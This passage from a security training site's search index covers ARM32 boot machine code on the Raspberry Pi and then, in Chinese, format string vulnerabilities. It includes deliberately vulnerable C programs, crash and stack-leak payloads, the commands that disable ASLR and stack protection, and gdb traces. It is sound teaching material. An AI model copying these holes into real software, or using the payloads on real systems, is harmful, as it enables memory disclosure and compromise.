<p>When the Pi boots, the below code when it reached kernel.img loads the following:</p> <p>FE FF FF EA</p> <p>@ address 0x8000, 0xfe gets loaded.</p> <p>@ address 0x8001, 0xff gets loaded.</p> <p>@ address 0x8002, 0xff gets loaded.</p> <p>@ address 0x8003, 0xea gets loaded.</p> <p>\u201cSo what the hell is really going on?\u201d</p> <p>This set of commands simply executes an infinite loop.</p> <p>Review the datasheet:</p> <p>https://www.raspberrypi.org/wp-content/uploads/2012/02/BCM2835-ARM-Peripherals.pdf</p> <p>The above code has 3 parts to it:</p> <p>1)Conditional \u2013 Set To Always</p> <p>2)Op Code \u2013 Branch</p> <p>3)Offset \u2013 How Far To Move Within The Current Location</p> <p>Condition \u2013 bits 31-28: 0xe or 1110</p> <p>Op Code \u2013 bits 27-24: 0xa or 1010</p> <p>Offset \u2013 bits 23-0 -2</p> <p>I know this may be a lot to wrap your mind around however it is critical that you take the time and read the datasheet linked above. Do not cut corners if you truly have the passion to understand the above. READ THE DATASHEET!</p> <p>I will go through painstaking efforts to break everything down step-by-step however there are exercises like the above that I am asking you to review the datasheet above so you learn how to better understand where to look when you are stuck on a particular routine or set of machine code. This is one of those times I ask you to please read and research the datasheet above!</p> <p>\u201cI\u2019m bored! Why the hell does this crap matter?\u201d</p> <p>Glad you asked! The single most dangerous malware on planet earth today is that of the root-kit variety. If you do not have a basic understanding of the above, you will never begin to even understand what a root-kit is as you progress in your understanding.</p> <p>Anyone can simply replace the kernel.img file with their own hacked version and you can have total control over the entire process from boot.</p>"},{"location":"Training/Material/ARM32_1/#part-12-von-neumann-architecture","title":"Part 12 - Von Neumann Architecture","text":"<p>ARM is a load and store machine to which the Arithmetic Logic Unit only operates on the registers themselves and any data that needs to be stored out to RAM, the control unit moves the data between memory and the registers which share the same data bus.</p> <p></p> <p>Program memory and data memory share the same data bus. This is what we call the Von Neumann Architecture. </p> <p>The CPU chip of this architecture holds a control unit and the arithmetic logic unit (along with some local memory) and the main memory is in the form of RAM sticks located on the motherboard.</p> <p>A stored-program digital computer is one that keeps its program instructions, as well as its data, in read-write, random-access memory or RAM.</p>"},{"location":"Training/Material/Binary%20Exploitation/","title":"Binary Exploitation","text":""},{"location":"Training/Material/Binary%20Exploitation/#311","title":"3.1.1 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","text":"<ul> <li>\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32</li> <li>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u672c\u539f\u7406</li> <li>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528</li> <li>x86-64 \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</li> <li>CTF \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</li> <li>\u6269\u5c55\u9605\u8bfb</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_1","title":"\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32","text":"<p>\u5728 C \u8bed\u8a00\u57fa\u7840\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u3002\u5728\u5f00\u59cb\u63a2\u7d22\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e4b\u524d\uff0c\u5f3a\u70c8\u5efa\u8bae\u56de\u987e\u8be5\u7ae0\u8282\u3002\u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u56de\u987e\u51e0\u4e2a\u5e38\u7528\u7684\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_2","title":"\u51fd\u6570","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint printf(const char *format, ...);\nint fprintf(FILE *stream, const char *format, ...);\nint dprintf(int fd, const char *format, ...);\nint sprintf(char *str, const char *format, ...);\nint snprintf(char *str, size_t size, const char *format, ...);\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#_3","title":"\u8f6c\u6362\u6307\u793a\u7b26","text":"\u5b57\u7b26 \u7c7b\u578b \u4f7f\u7528 d 4-byte Integer u 4-byte Unsigned Integer x 4-byte Hex s 4-byte ptr String c 1-byte Character"},{"location":"Training/Material/Binary%20Exploitation/#_4","title":"\u957f\u5ea6","text":"\u5b57\u7b26 \u7c7b\u578b \u4f7f\u7528 hh 1-byte char h 2-byte short int l 4-byte long int ll 8-byte long long int"},{"location":"Training/Material/Binary%20Exploitation/#_5","title":"\u793a\u4f8b","text":"<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nvoid main() {\n    char *format = \"%s\";\n    char *arg1 = \"Hello World!\\n\";\n    printf(format, arg1);\n}\nprintf(\"%03d.%03d.%03d.%03d\", 127, 0, 0, 1);    // \"127.000.000.001\"\nprintf(\"%.2f\", 1.2345);   // 1.23\nprintf(\"%#010x\", 3735928559);   // 0xdeadbeef\n\nprintf(\"%s%n\", \"01234\", &amp;n);  // n = 5\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#_6","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u672c\u539f\u7406","text":"<p>\u5728 x86 \u7ed3\u6784\u4e0b\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u662f\u901a\u8fc7\u6808\u4f20\u9012\u7684\uff0c\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    printf(\"%s %d %s\", \"Hello World!\", 233, \"\\n\");\n}\ngdb-peda$ disassemble main\nDump of assembler code for function main:\n   0x0000053d &lt;+0&gt;:     lea    ecx,[esp+0x4]\n   0x00000541 &lt;+4&gt;:     and    esp,0xfffffff0\n   0x00000544 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]\n   0x00000547 &lt;+10&gt;:    push   ebp\n   0x00000548 &lt;+11&gt;:    mov    ebp,esp\n   0x0000054a &lt;+13&gt;:    push   ebx\n   0x0000054b &lt;+14&gt;:    push   ecx\n   0x0000054c &lt;+15&gt;:    call   0x585 &lt;__x86.get_pc_thunk.ax&gt;\n   0x00000551 &lt;+20&gt;:    add    eax,0x1aaf\n   0x00000556 &lt;+25&gt;:    lea    edx,[eax-0x19f0]\n   0x0000055c &lt;+31&gt;:    push   edx\n   0x0000055d &lt;+32&gt;:    push   0xe9\n   0x00000562 &lt;+37&gt;:    lea    edx,[eax-0x19ee]\n   0x00000568 &lt;+43&gt;:    push   edx\n   0x00000569 &lt;+44&gt;:    lea    edx,[eax-0x19e1]\n   0x0000056f &lt;+50&gt;:    push   edx\n   0x00000570 &lt;+51&gt;:    mov    ebx,eax\n   0x00000572 &lt;+53&gt;:    call   0x3d0 &lt;printf@plt&gt;\n   0x00000577 &lt;+58&gt;:    add    esp,0x10\n   0x0000057a &lt;+61&gt;:    nop\n   0x0000057b &lt;+62&gt;:    lea    esp,[ebp-0x8]\n   0x0000057e &lt;+65&gt;:    pop    ecx\n   0x0000057f &lt;+66&gt;:    pop    ebx\n   0x00000580 &lt;+67&gt;:    pop    ebp\n   0x00000581 &lt;+68&gt;:    lea    esp,[ecx-0x4]\n   0x00000584 &lt;+71&gt;:    ret\nEnd of assembler dump.\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0x56557000 --&gt; 0x1efc\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0xffffd250 --&gt; 0x1\nEDX: 0x5655561f (\"%s %d %s\")\nESI: 0xf7f95000 --&gt; 0x1bbd90\nEDI: 0x0\nEBP: 0xffffd238 --&gt; 0x0\nESP: 0xffffd220 --&gt; 0x5655561f (\"%s %d %s\")\nEIP: 0x56555572 (&lt;main+53&gt;: call   0x565553d0 &lt;printf@plt&gt;)\nEFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555569 &lt;main+44&gt;:    lea    edx,[eax-0x19e1]\n   0x5655556f &lt;main+50&gt;:    push   edx\n   0x56555570 &lt;main+51&gt;:    mov    ebx,eax\n=&gt; 0x56555572 &lt;main+53&gt;:    call   0x565553d0 &lt;printf@plt&gt;\n   0x56555577 &lt;main+58&gt;:    add    esp,0x10\n   0x5655557a &lt;main+61&gt;:    nop\n   0x5655557b &lt;main+62&gt;:    lea    esp,[ebp-0x8]\n   0x5655557e &lt;main+65&gt;:    pop    ecx\nGuessed arguments:\narg[0]: 0x5655561f (\"%s %d %s\")\narg[1]: 0x56555612 (\"Hello World!\")\narg[2]: 0xe9\narg[3]: 0x56555610 --&gt; 0x6548000a ('\\n')\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd220 --&gt; 0x5655561f (\"%s %d %s\")\n0004| 0xffffd224 --&gt; 0x56555612 (\"Hello World!\")\n0008| 0xffffd228 --&gt; 0xe9\n0012| 0xffffd22c --&gt; 0x56555610 --&gt; 0x6548000a ('\\n')\n0016| 0xffffd230 --&gt; 0xffffd250 --&gt; 0x1\n0020| 0xffffd234 --&gt; 0x0\n0024| 0xffffd238 --&gt; 0x0\n0028| 0xffffd23c --&gt; 0xf7df1253 (&lt;__libc_start_main+243&gt;:   add    esp,0x10)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555572 in main ()\ngdb-peda$ r\nContinuing\nHello World! 233\n[Inferior 1 (process 27416) exited with code 022]\n</code></pre> <p>\u6839\u636e cdecl \u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u5728\u8fdb\u5165 <code>printf()</code> \u51fd\u6570\u4e4b\u524d\uff0c\u5c06\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u4f9d\u6b21\u538b\u6808\u3002\u8fdb\u5165 <code>printf()</code> \u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u3002\u5982\u679c\u5b57\u7b26\u4e0d\u662f <code>%</code>\uff0c\u5b57\u7b26\u76f4\u63a5\u590d\u5236\u5230\u8f93\u51fa\u4e2d\u3002\u5426\u5219\uff0c\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\u5e76\u89e3\u6790\u8f93\u51fa\u3002\uff08\u6ce8\u610f\uff1a<code>% d</code> \u548c <code>%d</code> \u662f\u4e00\u6837\u7684\uff09</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u7ed9\u683c\u5f0f\u5b57\u7b26\u4e32\u52a0\u4e0a <code>%x %x %x %3$s</code>\uff0c\u4f7f\u5b83\u51fa\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    printf(\"%s %d %s %x %x %x %3$s\", \"Hello World!\", 233, \"\\n\");\n}\n</code></pre> <p>\u53cd\u6c47\u7f16\u540e\u7684\u4ee3\u7801\u540c\u4e0a\uff0c\u6ca1\u6709\u4efb\u4f55\u533a\u522b\u3002\u6211\u4eec\u4e3b\u8981\u770b\u4e00\u4e0b\u53c2\u6570\u4f20\u9012\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0x56557000 --&gt; 0x1efc\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0xffffd250 --&gt; 0x1\nEDX: 0x5655561f (\"%s %d %s %x %x %x %3$s\")\nESI: 0xf7f95000 --&gt; 0x1bbd90\nEDI: 0x0\nEBP: 0xffffd238 --&gt; 0x0\nESP: 0xffffd220 --&gt; 0x5655561f (\"%s %d %s %x %x %x %3$s\")\nEIP: 0x56555572 (&lt;main+53&gt;: call   0x565553d0 &lt;printf@plt&gt;)\nEFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555569 &lt;main+44&gt;:    lea    edx,[eax-0x19e1]\n   0x5655556f &lt;main+50&gt;:    push   edx\n   0x56555570 &lt;main+51&gt;:    mov    ebx,eax\n=&gt; 0x56555572 &lt;main+53&gt;:    call   0x565553d0 &lt;printf@plt&gt;\n   0x56555577 &lt;main+58&gt;:    add    esp,0x10\n   0x5655557a &lt;main+61&gt;:    nop\n   0x5655557b &lt;main+62&gt;:    lea    esp,[ebp-0x8]\n   0x5655557e &lt;main+65&gt;:    pop    ecx\nGuessed arguments:\narg[0]: 0x5655561f (\"%s %d %s %x %x %x %3$s\")\narg[1]: 0x56555612 (\"Hello World!\")\narg[2]: 0xe9\narg[3]: 0x56555610 --&gt; 0x6548000a ('\\n')\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd220 --&gt; 0x5655561f (\"%s %d %s %x %x %x %3$s\")\n0004| 0xffffd224 --&gt; 0x56555612 (\"Hello World!\")\n0008| 0xffffd228 --&gt; 0xe9\n0012| 0xffffd22c --&gt; 0x56555610 --&gt; 0x6548000a ('\\n')\n0016| 0xffffd230 --&gt; 0xffffd250 --&gt; 0x1\n0020| 0xffffd234 --&gt; 0x0\n0024| 0xffffd238 --&gt; 0x0\n0028| 0xffffd23c --&gt; 0xf7df1253 (&lt;__libc_start_main+243&gt;:   add    esp,0x10)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555572 in main ()\ngdb-peda$ c\nContinuing.\nHello World! 233\n ffffd250 0 0\n[Inferior 1 (process 27480) exited with code 041]\n</code></pre> <p>\u8fd9\u4e00\u6b21\u6808\u7684\u7ed3\u6784\u548c\u4e0a\u4e00\u6b21\u76f8\u540c\uff0c\u53ea\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\u6709\u53d8\u5316\u3002\u7a0b\u5e8f\u6253\u5370\u51fa\u4e86\u4e03\u4e2a\u503c\uff08\u5305\u62ec\u6362\u884c\uff09\uff0c\u800c\u6211\u4eec\u5176\u5b9e\u53ea\u7ed9\u51fa\u4e86\u524d\u4e09\u4e2a\u503c\u7684\u5185\u5bb9\uff0c\u540e\u9762\u7684\u4e09\u4e2a <code>%x</code> \u6253\u5370\u51fa\u4e86 <code>0xffffd230~0xffffd238</code> \u6808\u5185\u7684\u6570\u636e\uff0c\u8fd9\u4e9b\u90fd\u4e0d\u662f\u6211\u4eec\u8f93\u5165\u7684\u3002\u800c\u6700\u540e\u4e00\u4e2a\u53c2\u6570 <code>%3$s</code> \u662f\u5bf9 <code>0xffffd22c</code> \u4e2d <code>\\n</code> \u7684\u91cd\u7528\u3002</p> <p>\u4e0a\u4e00\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u4e2d\u8981\u6c42\u7684\u53c2\u6570\u4e2a\u6570\u5927\u4e8e\u6211\u4eec\u63d0\u4f9b\u7684\u53c2\u6570\u4e2a\u6570\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u7701\u53bb\u4e86\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u540c\u6837\u5b58\u5728\u6f0f\u6d1e\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    char buf[50];\n    if (fgets(buf, sizeof buf, stdin) == NULL)\n        return;\n    printf(buf);\n}\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd1fa (\"Hello %x %x %x !\\n\")\nEBX: 0x56557000 --&gt; 0x1ef8\nECX: 0xffffd1fa (\"Hello %x %x %x !\\n\")\nEDX: 0xf7f9685c --&gt; 0x0\nESI: 0xf7f95000 --&gt; 0x1bbd90\nEDI: 0x0\nEBP: 0xffffd238 --&gt; 0x0\nESP: 0xffffd1e0 --&gt; 0xffffd1fa (\"Hello %x %x %x !\\n\")\nEIP: 0x5655562a (&lt;main+77&gt;: call   0x56555450 &lt;printf@plt&gt;)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555623 &lt;main+70&gt;:    sub    esp,0xc\n   0x56555626 &lt;main+73&gt;:    lea    eax,[ebp-0x3e]\n   0x56555629 &lt;main+76&gt;:    push   eax\n=&gt; 0x5655562a &lt;main+77&gt;:    call   0x56555450 &lt;printf@plt&gt;\n   0x5655562f &lt;main+82&gt;:    add    esp,0x10\n   0x56555632 &lt;main+85&gt;:    jmp    0x56555635 &lt;main+88&gt;\n   0x56555634 &lt;main+87&gt;:    nop\n   0x56555635 &lt;main+88&gt;:    mov    eax,DWORD PTR [ebp-0xc]\nGuessed arguments:\narg[0]: 0xffffd1fa (\"Hello %x %x %x !\\n\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd1e0 --&gt; 0xffffd1fa (\"Hello %x %x %x !\\n\")\n0004| 0xffffd1e4 --&gt; 0x32 ('2')\n0008| 0xffffd1e8 --&gt; 0xf7f95580 --&gt; 0xfbad2288\n0012| 0xffffd1ec --&gt; 0x565555f4 (&lt;main+23&gt;: add    ebx,0x1a0c)\n0016| 0xffffd1f0 --&gt; 0xffffffff\n0020| 0xffffd1f4 --&gt; 0xffffd47a (\"/home/firmy/Desktop/RE4B/c.out\")\n0024| 0xffffd1f8 --&gt; 0x65485ea0\n0028| 0xffffd1fc (\"llo %x %x %x !\\n\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x5655562a in main ()\ngdb-peda$ c\nContinuing.\nHello 32 f7f95580 565555f4 !\n[Inferior 1 (process 28253) exited normally]\n</code></pre> <p>\u5982\u679c\u5927\u5bb6\u90fd\u662f\u597d\u5b69\u5b50\uff0c\u8f93\u5165\u6b63\u5e38\u7684\u5b57\u7b26\uff0c\u7a0b\u5e8f\u5c31\u4e0d\u4f1a\u6709\u95ee\u9898\u3002\u7531\u4e8e\u6ca1\u6709\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u5728 <code>buf</code> \u4e2d\u8f93\u5165\u4e00\u4e9b\u8f6c\u6362\u6307\u793a\u7b26\uff0c\u5219 <code>printf()</code> \u4f1a\u628a\u5b83\u5f53\u505a\u683c\u5f0f\u5b57\u7b26\u4e32\u5e76\u89e3\u6790\uff0c\u6f0f\u6d1e\u53d1\u751f\u3002\u4f8b\u5982\u4e0a\u9762\u6f14\u793a\u7684\u6211\u4eec\u8f93\u5165\u4e86 <code>Hello %x %x %x !\\n</code>\uff08\u5176\u4e2d <code>\\n</code> \u662f <code>fgets()</code> \u51fd\u6570\u7ed9\u6211\u4eec\u81ea\u52a8\u52a0\u4e0a\u7684\uff09\uff0c\u8fd9\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8f93\u51fa\u6808\u5185\u7684\u6570\u636e\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0c\u5176\u5b9e\u683c\u5f0f\u5b57\u7b26\u4e32\u6f0f\u6d1e\u53d1\u751f\u7684\u6761\u4ef6\u5c31\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\u8981\u6c42\u7684\u53c2\u6570\u548c\u5b9e\u9645\u63d0\u4f9b\u7684\u53c2\u6570\u4e0d\u5339\u914d\u3002\u4e0b\u9762\u6211\u4eec\u8ba8\u8bba\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ul> <li> <p>\u4e3a\u4ec0\u4e48\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\uff1f</p> </li> <li> <p>\u56e0\u4e3a <code>printf()</code> \u51fd\u6570\u7684\u53c2\u6570\u88ab\u5b9a\u4e49\u4e3a\u53ef\u53d8\u7684\u3002</p> </li> <li>\u4e3a\u4e86\u53d1\u73b0\u4e0d\u5339\u914d\u7684\u60c5\u51b5\uff0c\u7f16\u8bd1\u5668\u9700\u8981\u7406\u89e3 <code>printf()</code> \u662f\u600e\u4e48\u5de5\u4f5c\u7684\u548c\u683c\u5f0f\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\u3002\u7136\u800c\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u77e5\u9053\u8fd9\u4e9b\u3002</li> <li> <p>\u6709\u65f6\u683c\u5f0f\u5b57\u7b26\u4e32\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u53ef\u80fd\u5728\u7a0b\u5e8f\u6267\u884c\u4e2d\u52a8\u6001\u751f\u6210\u3002</p> </li> <li> <p><code>printf()</code></p> </li> </ul> <p>\u51fd\u6570\u81ea\u5df1\u53ef\u4ee5\u53d1\u73b0\u4e0d\u5339\u914d\u5417\uff1f</p> <ul> <li><code>printf()</code> \u51fd\u6570\u4ece\u6808\u4e2d\u53d6\u51fa\u53c2\u6570\uff0c\u5982\u679c\u5b83\u9700\u8981 3 \u4e2a\uff0c\u90a3\u5b83\u5c31\u53d6\u51fa 3 \u4e2a\u3002\u9664\u975e\u6808\u7684\u8fb9\u754c\u88ab\u6807\u8bb0\u4e86\uff0c\u5426\u5219 <code>printf()</code> \u662f\u4e0d\u4f1a\u77e5\u9053\u5b83\u53d6\u51fa\u7684\u53c2\u6570\u6bd4\u63d0\u4f9b\u7ed9\u5b83\u7684\u53c2\u6570\u591a\u4e86\u3002\u7136\u800c\u5e76\u6ca1\u6709\u8fd9\u6837\u7684\u6807\u8bb0\u3002</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_7","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528","text":"<p>\u901a\u8fc7\u63d0\u4f9b\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u63a7\u5236\u683c\u5f0f\u5316\u51fd\u6570\u7684\u884c\u4e3a\u3002\u6f0f\u6d1e\u7684\u5229\u7528\u4e3b\u8981\u6709\u4e0b\u9762\u51e0\u79cd\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_8","title":"\u4f7f\u7a0b\u5e8f\u5d29\u6e83","text":"<p>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u901a\u5e38\u8981\u5728\u7a0b\u5e8f\u5d29\u6e83\u65f6\u624d\u4f1a\u88ab\u53d1\u73b0\uff0c\u6240\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u8fdb\u7a0b\u5d29\u6e83\u3002\u5728 Linux \u4e2d\uff0c\u5b58\u53d6\u65e0\u6548\u7684\u6307\u9488\u4f1a\u5f15\u8d77\u8fdb\u7a0b\u6536\u5230 <code>SIGSEGV</code> \u4fe1\u53f7\uff0c\u4ece\u800c\u4f7f\u7a0b\u5e8f\u975e\u6b63\u5e38\u7ec8\u6b62\u5e76\u4ea7\u751f\u6838\u5fc3\u8f6c\u50a8\uff08\u5728 Linux \u57fa\u7840\u7684\u7ae0\u8282\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u6838\u5fc3\u8f6c\u50a8\uff09\u3002\u6211\u4eec\u77e5\u9053\u6838\u5fc3\u8f6c\u50a8\u4e2d\u5b58\u50a8\u4e86\u7a0b\u5e8f\u5d29\u6e83\u65f6\u7684\u8bb8\u591a\u91cd\u8981\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u6b63\u662f\u653b\u51fb\u8005\u6240\u9700\u8981\u7684\u3002</p> <p>\u5229\u7528\u7c7b\u4f3c\u4e0b\u9762\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\uff1a</p> <pre><code>printf(\"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\")\n</code></pre> <ul> <li>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a <code>%s</code>\uff0c<code>printf()</code> \u90fd\u8981\u4ece\u6808\u4e2d\u83b7\u53d6\u4e00\u4e2a\u6570\u5b57\uff0c\u628a\u8be5\u6570\u5b57\u89c6\u4e3a\u4e00\u4e2a\u5730\u5740\uff0c\u7136\u540e\u6253\u5370\u51fa\u5730\u5740\u6307\u5411\u7684\u5185\u5b58\u5185\u5bb9\uff0c\u76f4\u5230\u51fa\u73b0\u4e00\u4e2a NULL \u5b57\u7b26\u3002</li> <li>\u56e0\u4e3a\u4e0d\u53ef\u80fd\u83b7\u53d6\u7684\u6bcf\u4e00\u4e2a\u6570\u5b57\u90fd\u662f\u5730\u5740\uff0c\u6570\u5b57\u6240\u5bf9\u5e94\u7684\u5185\u5b58\u53ef\u80fd\u5e76\u4e0d\u5b58\u5728\u3002</li> <li>\u8fd8\u6709\u53ef\u80fd\u83b7\u5f97\u7684\u6570\u5b57\u786e\u5b9e\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u4f46\u662f\u8be5\u5730\u5740\u662f\u88ab\u4fdd\u62a4\u7684\u3002</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_9","title":"\u67e5\u770b\u6808\u5185\u5bb9","text":"<p>\u4f7f\u7a0b\u5e8f\u5d29\u6e83\u53ea\u662f\u9a8c\u8bc1\u6f0f\u6d1e\u7684\u7b2c\u4e00\u6b65\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u6765\u83b7\u5f97\u5185\u5b58\u7684\u5185\u5bb9\uff0c\u4e3a\u4e0b\u4e00\u6b65\u6f0f\u6d1e\u5229\u7528\u505a\u51c6\u5907\u3002\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e0a\u53d6\u503c\u3002\u7531\u4e8e\u5728 x86 \u4e0a\u6808\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\uff0c\u800c <code>printf()</code> \u51fd\u6570\u7684\u53c2\u6570\u662f\u4ee5\u9006\u5e8f\u88ab\u538b\u5165\u6808\u7684\uff0c\u6240\u4ee5\u53c2\u6570\u5728\u5185\u5b58\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u4e0e\u5728 <code>printf()</code> \u8c03\u7528\u65f6\u51fa\u73b0\u7684\u987a\u5e8f\u662f\u4e00\u81f4\u7684\u3002</p> <p>\u4e0b\u9762\u7684\u6f14\u793a\u6211\u4eec\u90fd\u4f7f\u7528\u4e0b\u9762\u7684\u6e90\u7801\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    char format[128];\n    int arg1 = 1, arg2 = 0x88888888, arg3 = -1;\n    char arg4[10] = \"ABCD\";\n    scanf(\"%s\", format);\n    printf(format, arg1, arg2, arg3, arg4);\n    printf(\"\\n\");\n}\n# echo 0 &gt; /proc/sys/kernel/randomize_va_space\n$ gcc -m32 -fno-stack-protector -no-pie fmt.c\n</code></pre> <p>\u6211\u4eec\u5148\u8f93\u5165 <code>b main</code> \u8bbe\u7f6e\u65ad\u70b9\uff0c\u4f7f\u7528 <code>n</code> \u5f80\u4e0b\u6267\u884c\uff0c\u5728 <code>call 0x56555460 &lt;__isoc99_scanf@plt&gt;</code> \u5904\u8f93\u5165 <code>%08x.%08x.%08x.%08x.%08x</code>\uff0c\u7136\u540e\u4f7f\u7528 <code>c</code> \u7ee7\u7eed\u6267\u884c\uff0c\u5373\u53ef\u8f93\u51fa\u7ed3\u679c\u3002</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\")\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd550 --&gt; 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\")\nEIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]\n   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]\n   0x56555641 &lt;main+132&gt;:       push   eax\n=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;\n   0x56555647 &lt;main+138&gt;:       add    esp,0x20\n   0x5655564a &lt;main+141&gt;:       sub    esp,0xc\n   0x5655564d &lt;main+144&gt;:       push   0xa\n   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;\nGuessed arguments:\narg[0]: 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\")\narg[1]: 0x1\narg[2]: 0x88888888\narg[3]: 0xffffffff\narg[4]: 0xffffd57a (\"ABCD\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd550 